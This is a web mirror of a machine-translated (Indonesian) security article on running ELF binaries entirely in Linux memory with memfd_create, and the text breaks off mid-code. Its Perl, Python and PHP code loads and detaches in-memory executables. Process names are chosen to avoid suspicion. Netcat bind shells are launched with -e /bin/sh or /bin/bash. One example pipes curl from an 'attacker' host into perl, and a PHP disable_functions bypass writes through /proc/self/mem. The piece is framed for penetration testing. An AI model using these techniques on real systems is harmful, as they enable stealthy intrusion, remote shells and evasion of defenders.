<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üö∂ üê∫ üë®üèΩ‚Äçü§ù‚Äçüë®üèª Elf dalam memori. Menjalankan ELF di Linux RAM üóæ üë©üèº‚Äçüé® üëÖ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Distribusi malware bebas-file semakin populer. Yang tidak mengherankan, karena pekerjaan program semacam itu hampir tidak meninggalkan jejak. Pada art...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Elf dalam memori. Menjalankan ELF di Linux RAM</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/fbk_cs/blog/430902/"><p><img src="https://habrastorage.org/webt/rg/xt/yd/rgxtyd3contgoitlza_ve1zah2g.jpeg"></p><br><p> Distribusi malware bebas-file semakin populer.  Yang tidak mengherankan, karena pekerjaan program semacam itu hampir tidak meninggalkan jejak.  Pada artikel ini kita tidak akan menyentuh teknik menjalankan program di memori Windows.  Kami fokus pada GNU / Linux.  Linux dengan tepat mendominasi segmen server, hidup di jutaan perangkat tertanam dan menyediakan sebagian besar sumber daya web.  Selanjutnya, kami akan melakukan tinjauan singkat tentang kemungkinan menjalankan program dalam memori dan menunjukkan bahwa ini mungkin bahkan dalam kondisi yang sulit. </p><a name="habracut"></a><br><p>  Teknik eksekusi tanpa file bersifat rahasia, sangat sulit untuk mendeteksi dan melacak penggunaannya.  Alat kontrol integritas sistem file tidak akan memperingatkan administrator, karena tidak ada operasi penulisan ke disk atau perubahan file pada disk terjadi.  Perangkat lunak antivirus (sering diabaikan oleh pengguna * nix) sering tidak memonitor memori program setelah startup.  Selain itu, di banyak distribusi GNU / Linux, segera setelah instalasi, tersedia beragam utilitas debugging, interpreter, kompiler bahasa pemrograman dan pustaka untuk mereka.  Semua ini menciptakan kondisi yang sangat baik untuk menggunakan teknik eksekusi program rahasia dan bebas file.  Tetapi di samping keuntungan dari penggunaannya, ada juga kelemahan - program-program ini tidak selamat dari pemadaman atau reboot host target.  Tetapi saat tuan rumah sedang berjalan, program bekerja. </p><br><p>  Teknik semacam itu dapat dan harus digunakan tidak hanya untuk distribusi malware.  Jika kecepatan eksekusi program Anda sangat penting bagi Anda, keluarkan ke dalam RAM.  Sebenarnya, banyak distribusi Linux terasa hebat ketika benar-benar berjalan dalam RAM, yang memungkinkan Anda untuk bekerja dengan hard drive tanpa menyimpan file apa pun di dalamnya.  Dari sudut pandang audit keamanan informasi, metode pelaksanaan program terselubung sangat berguna sebagai tahap pasca operasi dan pengintaian dalam batas jaringan target.  Apalagi jika kerahasiaan maksimum adalah salah satu syarat audit. <br>  Menurut portal <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">barkly.com</a> pada tahun 2018, sudah 35% serangan virus terjadi pada perangkat lunak berbahaya yang berjalan di memori. </p><br><p>  Dalam kasus Windows, penjahat cyber secara aktif menggunakan sistem Powershell yang sudah diinstal sebelumnya untuk mengunduh dan segera menjalankan kode.  Teknik-teknik ini banyak digunakan, antara lain, berkat implementasinya dalam kerangka kerja seperti Powershell Empire, Powersploit, dan Metasploit Framework. </p><br><h1 id="a-chto-naschet-linux">  Bagaimana dengan Linux? </h1><br><p>  Dalam kebanyakan kasus, distribusi Linux yang diinstal pada host memiliki seperangkat perangkat lunak yang sudah diinstal sebelumnya.  Out of the box, sebagai aturan, tersedia penerjemah bahasa pemrograman: Python, Perl, compiler C. PHP hadir di situs hosting di appendage.  Kondisi ini memberikan kemampuan untuk mengeksekusi kode menggunakan bahasa-bahasa ini. </p><br><p>  Di Linux, kami memiliki beberapa opsi terkenal untuk mengeksekusi kode dalam memori. <br>  Cara termudah adalah dengan menggunakan area memori bersama yang sudah terpasang pada sistem file. </p><br><p>  Dengan menempatkan file yang dapat dieksekusi di direktori / dev / shm atau / run / shm, dimungkinkan untuk menjalankannya dalam memori secara langsung, mengingat direktori ini tidak lebih dari memori akses acak yang dipasang pada sistem file.  Tetapi mereka dapat dilihat dengan ls seperti direktori lainnya.  Dan sebagai aturan, direktori ini di-mount dengan flag noexec, dan eksekusi program dalam direktori ini hanya tersedia untuk pengguna super.  Jadi, untuk menjadi sedikit lebih tidak mencolok, Anda perlu sesuatu yang lain. </p><br><p> Yang lebih penting adalah <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">memfokuskan pada</a> panggilan sistem <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">(2)</a> .  Panggilan sistem ini berfungsi seperti <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">malloc (3)</a> , tetapi tidak mengembalikan pointer ke area memori, tetapi deskriptor file ke file anonim, yang terlihat dalam sistem file hanya sebagai tautan di <code>/proc/PID/fd/</code> , yang dapat dieksekusi dengan menggunakan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">mengeksekusi (2).</a> <br>  Inilah yang dikatakan halaman manual untuk menggunakan panggilan sistem <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">memfd_create (dalam bahasa Rusia)</a> : </p><br><p>  <em>"Nama yang ditentukan dalam</em> <code>name</code> <em>digunakan sebagai nama file dan akan ditampilkan sebagai target dari tautan simbolik yang sesuai dalam direktori. <code>/proc/self/fd/</code> . Nama tampilan selalu dimulai dengan <code>memfd:</code> dan hanya untuk debugging. Nama tidak mempengaruhi perilaku file "deskriptor, dan karenanya banyak file dapat memiliki nama yang sama tanpa konsekuensi apa pun."</em> </p><br><p>  Contoh menggunakan <code>memfd_create()</code> untuk bahasa C: </p><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/wait.h&gt; #include &lt;unistd.h&gt; int main() { int fd; pid_t child; char buf[BUFSIZ] = ""; ssize_t br; fd = syscall(SYS_memfd_create, "foofile", 0); if (fd == -1) { perror("memfd_create"); exit(EXIT_FAILURE); } child = fork(); if (child == 0) { dup2(fd, 1); close(fd); execlp("/bin/date", "/bin/date", NULL); perror("execlp date"); exit(EXIT_FAILURE); } else if (child == -1) { perror("fork"); exit(EXIT_FAILURE); } waitpid(child, NULL, 0); lseek(fd, 0, SEEK_SET); br = read(fd, buf, BUFSIZ); if (br == -1) { perror("read"); exit(EXIT_FAILURE); } buf[br] = 0; printf("child said: '%s'\n", buf); exit(EXIT_SUCCESS); }</span></span></span></span></code> </pre><br><p>  Kode di atas menggunakan <code>memfd</code> , membuat proses anak, mengarahkan outputnya ke file sementara, menunggu proses anak selesai, dan membaca outputnya dari file sementara.  Biasanya, pipa "|" digunakan untuk mengarahkan output dari satu program ke input yang lain di * nix. </p><br><p>  Kemampuan untuk menggunakan <code>syscall()</code> juga tersedia dalam bahasa yang ditafsirkan seperti perl, python, dll ... Selanjutnya, kami mempertimbangkan salah satu skenario yang mungkin dan menunjukkan kemampuan untuk memuat file yang dapat dieksekusi ke dalam memori menggunakan <code>memfd_create()</code> . </p><br><h3 id="perl">  Perl </h3><br><p>  Misalkan kita memiliki titik masuk dalam bentuk injeksi perintah. <br>  Kami membutuhkan cara untuk melakukan panggilan sistem pada sistem target. <br>  Dalam perl, fungsi <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">syscall ()</a> akan membantu kita dengan ini. <br>  Kami juga akan membutuhkan cara untuk menulis ELF kami langsung ke memori sebagai isi dari file anonim. <br>  Untuk melakukan ini, kami akan menempatkan ELF kami langsung di badan skrip, yang pada gilirannya akan ditransfer ke sistem target melalui injeksi perintah yang tersedia.  Atau, Anda juga dapat mengunduh file yang dapat dieksekusi melalui jaringan. <br>  Namun sebelum itu perlu dilakukan reservasi.  Kita perlu mengetahui versi kernel linux pada host target, karena <code>memfd_create()</code> sistem yang diperlukan hanya tersedia dari versi <strong>3.17</strong> dan lebih tinggi. </p><br><p>  Mari kita <code>memfd_create()</code> lebih dekat pada <code>memfd_create()</code> dan <code>execve()</code> </p><br><p>  Untuk file anonim kami, kami akan menggunakan <code>MFD_CLOEXEC</code> konstan, yang "mengatur flag <code>close-on-exec (FD_CLOEXEC)</code> untuk deskriptor file terbuka baru."  Ini berarti deskriptor file kami akan ditutup secara otomatis setelah kami mengeksekusi ELF kami menggunakan <code>execve()</code> </p><br><p>  Karena kita akan menggunakan fungsi <code>syscall()</code> dari bahasa Perl, kita perlu nilai numerik untuk memanggil <code>syscall</code> dan parameternya. <br>  Anda dapat menemukannya di <code>/usr/include</code> atau di Internet.  Nomor panggilan sistem dapat ditemukan di <code>#define</code> dimulai dengan <code>__NR_</code> <br>  Dalam kasus kami, <code>memfd_create()</code> diberi nomor 319 untuk OS 64-bit.  Dan konstanta adalah <code>FD_CLOSEXEC 0x0001U</code> (yaitu, 1 di file <code>linux/memfd.h</code> ) </p><br><p>  Sekarang kita memiliki semua nilai numerik yang diperlukan, dan kita dapat menulis dalam Perl sebuah analog dari <code>memfd_create(name, MFD_CLOEXEC)</code> dari C. <br>  Kami juga perlu membuat nama file yang akan ditampilkan di <code>/memfd:</code> <br>  Akan lebih optimal untuk memilih nama yang mirip dengan <code>[:kworker]</code> atau yang lain, tidak menimbulkan kecurigaan. <br>  Misalnya, kami akan meneruskan string kosong ke parameter nama: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $name = <span class="hljs-string"><span class="hljs-string">""</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $fd = <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span>(<span class="hljs-number"><span class="hljs-number">319</span></span>, $name, <span class="hljs-number"><span class="hljs-number">1</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (-<span class="hljs-number"><span class="hljs-number">1</span></span> == $fd) { <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"memfd_create: $!"</span></span>; }</code> </pre> <br><p>  Sekarang kita memiliki deskriptor file anonim dalam $ fd dan kita perlu menulis ELF ke file ini. <br>  Fungsi <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">open ()</a> dalam perl biasanya digunakan untuk membuka file, tetapi menggunakan konstruksi <code>&gt;&amp;=FD</code> , meneruskan deskriptor ke fungsi ini alih-alih nama file, kami mengubah deskriptor file yang sudah terbuka menjadi pegangan file. <br>  <code>autoflush[]</code> juga bermanfaat bagi <code>autoflush[]</code> : </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">open</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $FH, <span class="hljs-string"><span class="hljs-string">'&gt;&amp;='</span></span>.$fd) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"open: $!"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">select</span></span>((<span class="hljs-keyword"><span class="hljs-keyword">select</span></span>($FH), $|=<span class="hljs-number"><span class="hljs-number">1</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]);</code> </pre> <br><p>  Sekarang kami memiliki pegangan yang merujuk ke file anonim. </p><br><p>  Selanjutnya, kita perlu mengkonversi file yang dapat dieksekusi menjadi data yang dapat ditempatkan di tubuh skrip Perl. <br>  Untuk melakukan ini, kami melakukan: </p><br><pre> <code class="plaintext hljs">$ perl -e '$/=\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(&lt;&gt;)' ./elfbinary</code> </pre> <br><p>  Kami mendapatkan banyak, banyak baris serupa: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">7</span></span>f454c4602010100000000000000000002003e0001000000304f45000000000<span class="hljs-number"><span class="hljs-number">0</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/; <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">4000000000000000</span></span>c8010000000000000000000040003800070040001700030<span class="hljs-number"><span class="hljs-number">0</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/; <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">0600000004000000400000000000000040004000000000004000400000000000</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/;</code> </pre> <br><p>  Setelah mengeksekusi mereka, kami akan meletakkan file yang dapat dieksekusi kami dalam memori.  Yang tersisa bagi kita adalah meluncurkannya. </p><br><h4 id="fork">  garpu () </h4><br><p>  Secara opsional kita bisa menggunakan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">fork ()</a> .  Ini tidak perlu sama sekali.  Tetapi jika kita ingin tidak hanya menjalankan ELF dan mematikan prosesnya, kita perlu menggunakan <code>fork()</code> . <br>  Secara umum, membuat proses anak di perl terlihat seperti ini: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">while</span></span> ($keep_going) { <span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $pid = <span class="hljs-keyword"><span class="hljs-keyword">fork</span></span>(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (-<span class="hljs-number"><span class="hljs-number">1</span></span> == $pid) { <span class="hljs-comment"><span class="hljs-comment"># Error die "fork: $!"; } if (0 == $pid) { exit 0; } }</span></span></code> </pre> <br><p>  Kegunaan <code>fork()</code> juga <code>fork()</code> pada fakta bahwa dengan memanggilnya bersamaan dengan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">setsid (2)</a> , Anda dapat memisahkan proses anak dari proses induk dan membiarkan orangtua mengakhiri: </p><br><pre> <code class="perl hljs"><span class="hljs-comment"><span class="hljs-comment">#    my $pid = fork(); if (-1 == $pid) { # Error die "fork1: $!"; } if (0 != $pid) { #   exit 0; } #     if (-1 == syscall(112)) { die "setsid: $!"; } #    () $pid = fork(); if (-1 == $pid) { # Error die "fork2: $!"; } if (0 != $pid) { #    exit 0; } #   ""</span></span></code> </pre> <br><p>  Sekarang kita dapat menjalankan ELF dalam banyak proses. </p><br><h4 id="execve">  Execve () </h4><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Execve ()</a> adalah panggilan sistem yang memungkinkan kita untuk menjalankan suatu program.  Perl menyediakan fungsionalitas serupa kepada kami melalui fungsi <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Exec ()</a> , yang berfungsi seperti pemanggilan sistem yang disebutkan di atas, tetapi memiliki sintaks yang jauh lebih sederhana dan lebih nyaman. <br>  Kita perlu memberikan dua hal ke <code>exec()</code> : file yang ingin kita jalankan (memori ELF yang sebelumnya dimuat), dan nama proses sebagai salah satu argumen yang diteruskan.  Biasanya nama proses sesuai dengan nama file yang dapat dieksekusi.  Tetapi karena kita akan melihat <code>/proc/PID/fd/3</code> dalam daftar proses, kita akan menyebut proses kita sesuatu yang lain. <br>  Sintaks untuk <code>exec()</code> sebagai berikut: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">exec</span></span> {<span class="hljs-string"><span class="hljs-string">"/proc/$$/fd/$fd"</span></span>} <span class="hljs-string"><span class="hljs-string">"nc"</span></span>, <span class="hljs-string"><span class="hljs-string">"-kvl"</span></span>, <span class="hljs-string"><span class="hljs-string">"4444"</span></span>, <span class="hljs-string"><span class="hljs-string">"-e"</span></span>, <span class="hljs-string"><span class="hljs-string">"/bin/sh"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"exec: $!"</span></span>;</code> </pre> <br><p>  Contoh di atas memulai Netcat.  Tetapi kami ingin meluncurkan sesuatu yang sedikit kurang seperti pintu belakang. <br>  Proses yang diluncurkan tidak akan memiliki tautan ke file anonim di <code>/proc/PID/fd</code> , tetapi kami selalu dapat menemukan ELF kami di tautan <code>/proc/PID/exe</code> , yang mengarah ke file proses yang sedang berjalan. <br>  Jadi kami meluncurkan ELF dalam memori Linux, tanpa menyentuh disk dan bahkan sistem file. <br>  Dimungkinkan untuk mengunduh file yang dapat dieksekusi kami ke sistem target dengan cepat dan mudah, misalnya, dengan mengirimkan skrip ke penerjemah Perl, di mana kami menempatkan ELF dan meletakkannya di hosting web eksternal: <code>$ curl http://attacker/evil_elf.pl | perl</code> <code>$ curl http://attacker/evil_elf.pl | perl</code> </p><br><h3 id="python">  Python </h3><br><p>  Mirip dengan opsi Perl, kita perlu melakukan hal berikut: </p><br><ul><li>  menggunakan panggilan sistem memfd_create (), buat file anonim di memori </li><li>  tulis ELF yang dapat dieksekusi ke file ini </li><li>  jalankan dan secara opsional jalankan beberapa kali dengan fork () </li></ul><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> ctypes <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-comment"><span class="hljs-comment">#   .     - binary = open('/tmp/rev-shell','rb').read() fd = ctypes.CDLL(None).syscall(319,"",1) #  memfd_create     final_fd = open('/proc/self/fd/'+str(fd),'wb') #    . final_fd.write(binary) final_fd.close() fork1 = os.fork() #   if 0 != fork1: os._exit(0) ctypes.CDLL(None).syscall(112) #  setsid()     . fork2 = os.fork() #     . if 0 != fork2: os._exit(0) os.execl('/proc/self/fd/'+str(fd),'argv0','argv1') #    .</span></span></code> </pre> <br><p>  Dalam kasus python, untuk memanggil <code>syscall</code> kita memerlukan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">ctypes</a> dan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">os</a> modul standar untuk menulis dan mengeksekusi file dan mengontrol prosesnya.  Semuanya sepenuhnya analog dengan versi perl. <br>  Dalam kode di atas, kita menulis ke file file yang sebelumnya terletak di <code>/tmp/</code> .  Namun, tidak ada yang mencegah kami mengunduh file dari server web. </p><br><h3 id="php">  Php </h3><br><p>  Pada tahap ini, kita sudah bisa menggunakan perl dan python.  Penerjemah bahasa-bahasa ini diinstal secara default pada banyak sistem operasi.  Tapi yang paling menarik, seperti biasa, ada di depan. <br>  Jika, karena alasan tertentu, penerjemah perl atau python tidak tersedia bagi kami, alangkah baiknya menggunakan PHP.  Bahasa ini sangat populer di kalangan pengembang web.  Dan jika kita sudah menemukan kemampuan untuk mengeksekusi kode dalam aplikasi web, kemungkinan besar penerjemah PHP akan menemui kita. </p><br><p>  Sayangnya, php tidak memiliki mekanisme <code>syscall</code> untuk memanggil <code>syscall</code> . <br>  Kami menemukan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">posting</a> dari Beched'a di forum rdot (Terima kasih Beched!), Yang menimpa panggilan fungsi <code>open</code> ke <code>system</code> melalui <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">procfs</a> <code>/proc/self/mem</code> dalam memori proses saat ini dan memintas fungsi <code>disable_functions</code> . <br>  Kami menggunakan trik ini untuk menulis ulang fungsi ke kode kami, yang akan menyebabkan panggilan sistem yang diperlukan. <br>  Kami akan meneruskan syscall ke juru bahasa php dalam bentuk shellcode on assembler. <br>  Panggilan sistem perlu melewati serangkaian perintah. <br>  Mari kita mulai menulis skrip PHP.  Selanjutnya akan banyak keajaiban. </p><br><p>  Pertama, kami menunjukkan parameter yang diperlukan: </p><br><pre> <code class="php hljs"> $elf = file_get_contents(<span class="hljs-string"><span class="hljs-string">"/bin/nc.traditional"</span></span>); <span class="hljs-comment"><span class="hljs-comment">// elf_payload $args = "test -lvvp 31338 -e /bin/bash"; // argv0 argv1 argv2 ...</span></span></code> </pre> <br><p>  Nyatakan pergeseran - nilai atas dan bawah dalam memori, tempat kami akan menempatkan shellcode kami: </p><br><pre> <code class="php hljs"> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">packlli</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($value)</span></span></span><span class="hljs-function"> </span></span>{ $higher = ($value &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff00000000</span></span>) &gt;&gt; <span class="hljs-number"><span class="hljs-number">32</span></span>; $lower = $value &amp; <span class="hljs-number"><span class="hljs-number">0x00000000ffffffff</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> pack(<span class="hljs-string"><span class="hljs-string">'V2'</span></span>, $lower, $higher); }</code> </pre> <br><p>  Berikutnya adalah fungsi di mana file biner "dibongkar".  Untuk melakukan ini, kami mengonversi data biner ke representasi desimal menggunakan fungsi <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">hexdex ()</a> dari data biner <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">bin2hex ()</a> dalam <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">urutan terbalik</a> (untuk penyimpanan): </p><br><pre> <code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">unp</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($value)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> hexdec(bin2hex(strrev($value))); }</code> </pre> <br><p>  Selanjutnya, file <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">ELF</a> diurai untuk mendapatkan offset: </p><br><pre> <code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parseelf</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($bin_ver, $rela = false)</span></span></span><span class="hljs-function"> </span></span>{ $bin = file_get_contents($bin_ver); $e_shoff = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x28</span></span>, <span class="hljs-number"><span class="hljs-number">8</span></span>)); $e_shentsize = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3a</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); $e_shnum = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3c</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); $e_shstrndx = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3e</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>($i = <span class="hljs-number"><span class="hljs-number">0</span></span>; $i &lt; $e_shnum; $i += <span class="hljs-number"><span class="hljs-number">1</span></span>) { $sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + <span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($sh_type == <span class="hljs-number"><span class="hljs-number">11</span></span>) { <span class="hljs-comment"><span class="hljs-comment">// SHT_DYNSYM $dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); $dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8)); } elseif(!isset($strtab_off) &amp;&amp; $sh_type == 3) { // SHT_STRTAB $strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); } elseif($rela &amp;&amp; $sh_type == 4) { // SHT_RELA $relaplt_off = unp(substr($bin, $e_shoff + $i * $e_ + 24, 8)); $relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); $relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8)); } } if($rela) { for($i = $relaplt_off; $i &lt; $relaplt_off + $relaplt_size; $i += $relaplt_entsize) { $r_offset = unp(substr($bin, $i, 8)); $r_info = unp(substr($bin, $i + 8, 8)) &gt;&gt; 32; $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4)); $name = ''; $j = $strtab_off + $name_off - 1; while($bin[++$j] != "\0") { $name .= $bin[$j]; } if($name == 'open') { return $r_offset; } } } else { for($i = $dynsym_off; $i &lt; $dynsym_off + $dynsym_size; $i += $dynsym_entsize) { $name_off = unp(substr($bin, $i, 4)); $name = ''; $j = $strtab_off + $name_off - 1; while($bin[++$j] != "\0") { $name .= $bin[$j]; } if($name == '__libc_system') { $system_offset = unp(substr($bin, $i + 8, 8)); } if($name == '__open') { $open_offset = unp(substr($bin, $i + 8, 8)); } } return array($system_offset, $open_offset); }</span></span></code> </pre> <br><p>  Selain itu, kami menampilkan informasi tentang versi PHP yang diinstal: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!defined(<span class="hljs-string"><span class="hljs-string">'PHP_VERSION_ID'</span></span>)) { $version = explode(<span class="hljs-string"><span class="hljs-string">'.'</span></span>, PHP_VERSION); define(<span class="hljs-string"><span 